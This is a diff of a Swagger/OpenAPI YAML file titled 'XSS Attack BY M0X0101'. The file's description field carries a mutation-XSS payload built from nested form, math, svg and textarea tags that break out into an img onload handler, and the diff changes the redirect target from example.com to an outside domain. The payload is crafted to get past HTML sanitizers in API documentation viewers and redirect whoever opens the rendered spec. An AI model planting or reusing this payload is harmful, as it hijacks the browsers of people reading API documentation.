@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onload='window.location=https://www.example.com;' src='example.jpg' />"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onload='window.location=https://cyberarch.eu;' src='example.jpg' />"></form>
 
   version: production
 basePath: /JSSResource/
